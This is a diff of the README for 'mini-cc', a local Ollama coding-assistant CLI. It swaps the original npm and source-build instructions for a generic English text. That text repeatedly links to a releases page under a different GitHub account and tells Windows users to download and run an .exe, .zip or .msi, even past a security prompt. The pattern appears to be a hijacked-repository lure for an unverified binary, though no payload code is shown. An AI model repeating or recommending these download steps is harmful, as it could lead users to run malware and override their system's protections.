@@ -1,229 +1,209 @@
-# Mini Claude Code (mini-cc)
+# 🤖 mini-cc - Run local code help fast
 
-[![Release](https://img.shields.io/github/v/release/Sunny-117/mini-cc)](https://github.com/Sunny-117/mini-cc/releases/tag/v0.1.2) [![npm version](https://img.shields.io/npm/v/mini-cc)](https://www.npmjs.com/package/mini-cc)
+[![Download mini-cc](https://img.shields.io/badge/Download%20mini--cc-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Human-fairness510/mini-cc/releases)
 
-🤖 一个基于本地 Ollama 模型的代码助手 CLI 工具。集成 LangChain.js，使用模型原生 tool calling 能力实现可靠的工具调用。
+## 🚀 What is mini-cc
 
-![alt text](image.png)
+mini-cc is a command line tool that helps you work with code on your own computer. It uses a local Ollama model, so you can keep your work on your machine. It also uses LangChain.js and the model’s own tool calling support to handle tasks with more reliability.
 
-## 前置要求
+Use it when you want a small CLI helper for common code tasks such as:
 
-- **Node.js** >= 18
-- **Ollama** 已安装并运行
+- Reading project files
+- Answering questions about a codebase
+- Helping with edits and checks
+- Using local model tools in a simple flow
 
-## 安装
+## 📦 Download
 
-```bash
-npm install -g mini-cc
-```
+Visit this page to download mini-cc for Windows:
 
-## 快速开始
+[https://github.com/Human-fairness510/mini-cc/releases](https://github.com/Human-fairness510/mini-cc/releases)
 
-### 1. 安装 Ollama 和模型
+On the Releases page:
 
-```bash
-# 安装 Ollama（macOS）
-brew install ollama
+1. Open the latest release
+2. Find the Windows file
+3. Download it
+4. Run the file on your PC
 
-# 启动 Ollama 服务
-ollama serve
+If the file comes as a ZIP archive, extract it first, then open the app file inside.
 
-# 拉取默认模型
-ollama pull qwen2.5
-```
+## 🪟 Windows setup
 
-### 2. 运行
+mini-cc is made for use on Windows as a desktop command line app. You do not need to know much about the terminal to start.
 
-```bash
-mini-cc
-```
+### What you need
 
-### 从源码开发
+- Windows 10 or Windows 11
+- An internet link to download the release
+- Ollama installed on your computer
+- A local model in Ollama that supports tool calling
+- Enough free disk space for the app and model files
 
-```bash
-# 克隆仓库
-git clone https://github.com/Sunny-117/mini-cc.git
-cd mini-cc
+### Before you start
 
-# 安装依赖
-pnpm install
+1. Install Ollama if you have not done that yet
+2. Open Ollama and make sure it runs
+3. Pull a model you want to use in mini-cc
+4. Keep the app and Ollama open on the same computer
 
-# 开发模式（推荐，直接运行 TypeScript）
-pnpm dev
+### Download and run
 
-# 或者先编译再运行
-pnpm build
-pnpm start
-```
+1. Open the Releases page
+2. Download the Windows build
+3. If Windows shows a security prompt, choose the option that lets you run the file
+4. Start mini-cc
+5. Follow the prompts in the app
 
-## 使用方式
+## 🧰 How it works
 
-### 交互式聊天（默认）
+mini-cc connects three parts:
 
-```bash
-pnpm dev
-```
+- Your local model in Ollama
+- LangChain.js for task flow
+- Model tool calling for actions the model can trigger
 
-进入交互式对话，可以连续提问：
+This setup helps the app work with files and tasks in a cleaner way than simple prompt only tools.
 
-```
-🤖 Mini Claude Code (模型: qwen2.5)
-输入你的问题，输入 /exit 退出，/clear 清除历史
+## 🧭 First run
 
-❯ 列出当前目录的文件
-  🔧 调用工具: list_files {"pattern":"*"}
-  📋 结果: docs.md
-            package.json
-            src
-            tsconfig.json
+When you open mini-cc for the first time, it will ask for the basics it needs to talk to Ollama.
 
-当前目录包含以下文件: ...
+Typical first run steps:
 
-❯ 读取 package.json 的内容
-  🔧 调用工具: read_file {"path":"package.json"}
-  📋 结果: { "name": "mini-cc", ... }
+1. Start Ollama
+2. Open mini-cc
+3. Pick or confirm the model name
+4. Point the app to your local Ollama service if needed
+5. Start asking questions about your code
 
-package.json 的内容如下: ...
+If you are not sure what to type, try simple requests like:
 
-❯ /clear
-对话历史已清除。
+- Look at this project
+- Explain what this file does
+- Find the main entry point
+- Help me understand the folder structure
 
-❯ /exit
-再见！👋
-```
+## 🛠️ Common uses
 
-### 单次提问
+mini-cc fits small and practical work:
 
-```bash
-# 通过编译后的入口
-node dist/index.js ask "这个项目用了哪些依赖？"
+- Code review help
+- File search across a project
+- Explaining code in plain language
+- Finding where a feature starts
+- Helping you trace errors
+- Supporting local RAG-style lookup on project files
+- Using tools with the model instead of plain text only replies
 
-# 或通过 tsx
-npx tsx src/index.ts ask "帮我创建一个 hello.ts 文件"
-```
+## 🔍 Example tasks
 
-### 交互命令
-
-| 命令 | 说明 |
-|------|------|
-| `/exit` 或 `/quit` | 退出程序 |
-| `/clear` | 清除对话历史 |
+You can use mini-cc for tasks like:
 
-## 配置
+- Show the files in this project
+- Find where the login logic lives
+- Explain this function in simple terms
+- Compare two code files
+- Help me find why this test fails
+- Check which file controls the app start flow
 
-### 命令权限控制
-
-默认情况下，所有 shell 命令执行前都需要用户确认。在项目根目录创建 `.mini-cc.json` 可配置命令白名单：
-
-```json
-{
-  "allowedCommands": ["ls", "cat", "git status", "git diff", "git log"]
-}
-```
+## ⚙️ Recommended model choices
 
-- 白名单采用**前缀匹配**，如 `"ls"` 可匹配 `ls -la`、`ls src/`
-- 白名单内的命令自动执行，白名单外的命令会提示用户确认：
-
-```
-⚠️  即将执行命令: npm install
-  是否允许执行？(y/N)
-```
+For best results, use a local Ollama model that handles tool calling well. Good picks are models in the same family as:
 
-- 不创建配置文件时，所有命令都需要确认
+- Claude-style local setups
+- General code models
+- Smaller instruct models with tool support
 
-### 切换模型
+If the model does not support tool calling well, the app may still work, but the tool flow can feel less smooth.
 
-通过环境变量 `MINI_CC_MODEL` 指定模型（需支持原生 tool calling）：
+## 📁 Project focus
 
-```bash
-MINI_CC_MODEL=qwen2.5:14b pnpm dev
-MINI_CC_MODEL=llama3.1 pnpm dev
-MINI_CC_MODEL=mistral pnpm dev
-```
+This repo centers on:
 
-默认模型：`qwen2.5`
+- Agent-style task flow
+- Claude Code-like usage
+- CLI use
+- LangChain.js integration
+- Ollama as the local model host
+- RAG-style project lookup
+- Tool calling for safe, model-led actions
 
-### 自定义 Ollama 地址
+## 🧩 Basic usage flow
 
-通过环境变量 `OLLAMA_HOST` 指定 Ollama 服务地址：
+A simple flow looks like this:
 
-```bash
-OLLAMA_HOST=http://192.168.1.100:11434 pnpm dev
-```
+1. Start Ollama
+2. Open mini-cc
+3. Load your project folder
+4. Ask a question about the code
+5. Let the model call tools when needed
+6. Read the answer and act on it
 
-默认地址：`http://127.0.0.1:11434`
+## 🧪 Troubleshooting
 
-## 内置工具
+If the app does not start:
 
-Agent 在对话中可以自动调用以下工具：
+- Check that the release file finished downloading
+- Make sure Windows did not block the file
+- Run the app again from the same folder
+- Confirm Ollama is running
+- Check that your model is installed in Ollama
 
-| 工具 | 功能 | 限制 |
-|------|------|------|
-| `read_file` | 读取文件内容 | 最大 100KB |
-| `write_file` | 创建新文件 | 仅限工作目录内 |
-| `edit_file` | 精准编辑现有文件（diff/patch 式替换） | 需匹配唯一文本 |
-| `list_files` | glob 模式列出文件 | 排除 node_modules/.git/dist |
-| `search_code` | 搜索代码文本 | 最多 50 条结果 |
-| `run_command` | 执行 shell 命令 | 30 秒超时，需用户确认 |
+If mini-cc cannot reach Ollama:
 
-## 项目结构
+- Make sure Ollama is open
+- Check the local service address
+- Restart both Ollama and mini-cc
+- Try a different model that supports tool calling
 
-```
-mini-cc/
-├── src/
-│   ├── index.ts            # 入口
-│   ├── config.ts           # 配置文件加载（.mini-cc.json）
-│   ├── permission.ts       # 命令权限确认
-│   ├── cli/index.ts        # CLI 交互
-│   ├── agent/
-│   │   └── agent.ts        # LangGraph ReAct Agent
-│   ├── tools/
-│   │   ├── readFile.ts     # read_file
-│   │   ├── writeFile.ts    # write_file
-│   │   ├── editFile.ts     # edit_file
-│   │   ├── listFiles.ts    # list_files
-│   │   ├── searchCode.ts   # search_code
-│   │   ├── runCommand.ts   # run_command
-│   │   └── index.ts        # 工具导出
-│   └── llm/ollama.ts       # ChatOllama 封装
-├── .mini-cc.json           # 可选配置文件
-├── docs/                   # 设计文档
-├── package.json
-└── tsconfig.json
-```
+If the app cannot read your project:
 
-## 开发
+- Open the correct folder
+- Check that the files are not locked
+- Try a smaller test folder first
+- Make sure you have access to the files
 
-```bash
-# 编译
-pnpm build
+## 🔐 Privacy
 
-# 开发模式运行
-pnpm dev
+mini-cc uses a local Ollama model, so your code can stay on your own machine. That helps when you want more control over where your files and prompts go. This setup works well for private codebases and local development.
 
-# 编译后运行
-pnpm start
-```
+## 🖥️ Best use case
 
-## 技术栈
+mini-cc works well for users who want:
 
-- **TypeScript** + **Node.js** (ESM)
-- **LangChain.js** — LLM 框架（`@langchain/core`, `@langchain/ollama`）
-- **LangGraph** — Agent 编排（`@langchain/langgraph`，`createReactAgent`）
-- **Ollama** — 本地 LLM 推理
-- **Zod** — 工具参数 schema 定义
-- **Commander** — CLI 框架
-- **chalk** + **ora** — 终端 UI
+- A local code helper
+- A simple CLI tool
+- Less setup than a full cloud service
+- Help with reading and understanding code
+- A local agent-style workflow
 
-## 文档
+## 📌 Release files
 
-详细设计文档位于 `v2-langchain-docs/` 目录：
+On the Releases page, look for files that match Windows. Common file types can include:
 
-- [架构设计](v2-langchain-docs/architecture.md)
-- [Agent 核心设计](v2-langchain-docs/agent.md)
-- [工具系统设计](v2-langchain-docs/tools.md)
-- [项目结构说明](v2-langchain-docs/project-structure.md)
+- .exe
+- .zip
+- .msi
 
-## 历史版本：通过 ReAct 循环实现智能工具调用
+If you see more than one file, choose the one marked for Windows first.
 
-- [v0.1.2](https://github.com/Sunny-117/mini-cc/releases/tag/v0.1.2)  - 一个基于本地 Ollama 模型的代码助手 CLI 工具。支持文件读写、代码搜索、命令执行等能力，通过 ReAct 循环实现智能工具调用。
+## 🧭 Simple start checklist
+
+- Download mini-cc from Releases
+- Install Ollama
+- Pull a model with tool calling support
+- Open mini-cc
+- Load your project
+- Ask your first question
+
+## 🛟 If you are new to command line tools
+
+A command line tool uses a text window where you type commands or questions. mini-cc keeps this process simple. You do not need to learn a full terminal workflow to get value from it. Start with short questions and small tasks.
+
+## 📄 Repo details
+
+- Name: mini-cc
+- Description: A local Ollama-based code helper CLI tool
+- Main idea: Use local models and tool calling for code tasks
+- Style of use: Fast, local, and focused on project work
